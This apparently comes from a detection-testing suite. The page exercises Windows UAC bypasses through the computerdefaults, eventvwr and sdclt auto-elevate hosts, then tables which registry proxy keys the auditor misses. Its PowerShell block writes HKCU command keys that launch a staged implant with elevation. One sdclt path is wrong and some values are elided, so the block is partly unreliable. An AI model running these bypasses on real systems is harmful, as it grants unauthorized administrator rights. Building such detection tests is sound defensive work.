# Test: Privilege escalation — UAC bypass family (fodhelper's siblings)

**Chain:** fodhelper was one bypass; `computerdefaults.exe`, `eventvwr.exe`, and
`sdclt.exe` are the other auto-elevate hosts, each with its own HKCU proxy key. Testing
the family reveals whether your detection covers the *pattern* or only the one key.

**Implant setup:** [`../_common/implant-build.md`](../_common/implant-build.md) — stage
`sysupd.exe` at `C:\Users\Public\` (or use any benign command in the proxy value).

**Victim (a NON-elevated PowerShell — that's the point):** `.\test.ps1` runs all three:

```powershell
# computerdefaults.exe -> same ms-settings key as fodhelper
New-Item HKCU:\Software\Classes\ms-settings\Shell\Open\command -Force
Set-ItemProperty HKCU:\...\command -Name "(default)" -Value "C:\Users\Public\sysupd.exe"
Start-Process C:\Windows\System32\computerdefaults.exe

# eventvwr.exe -> DIFFERENT key: mscfile (not covered by PERS-UAC-KEY today)
New-Item HKCU:\Software\Classes\mscfile\Shell\Open\command -Force
Set-ItemProperty HKCU:\Software\Classes\mscfile\Shell\Open\command -Name "(default)" -Value "..."
Start-Process C:\Windows\System32\eventvwr.exe

# sdclt.exe -> exefile\shell\runas\command\isolatedcommand (also not covered)
New-Item HKCU:\Software\Classes\exefile\shell\runas\command -Force
Set-ItemProperty ...\command -Name IsolatedCommand -Value "..."
Start-Process C:\Windows\System32\System32\sdclt.exe
```

**Expected vs gap:**

| Bypass | Key | Today |
|---|---|---|
| fodhelper / computerdefaults | `ms-settings\Shell\Open\command` | ✅ `PERS-UAC-KEY` (critical) — auditor covers this key |
| eventvwr | `mscfile\Shell\Open\command` | ❌ GAP — auditor doesn't inventory mscfile |
| sdclt | `exefile\shell\runas\command` | ❌ GAP |

All three elevated launches of `sysupd.exe` still fire the standard launch chain
(`EVT-4688-TEMP`, `PROG-IMPLANT-LAUNCH`, `NET-BEACON`) — the bypass method varies, the
payload launch detection doesn't. **Fix to file:** extend the auditor's UAC inventory to
the `mscfile` and `exefile` proxy keys (same pattern as ms-settings).

**Cleanup:** `Remove-Item -Recurse HKCU:\Software\Classes\ms-settings, HKCU:\Software\Classes\mscfile, HKCU:\Software\Classes\exefile` (exefile carefully — only the shell\runas subkey if legit apps use exefile).
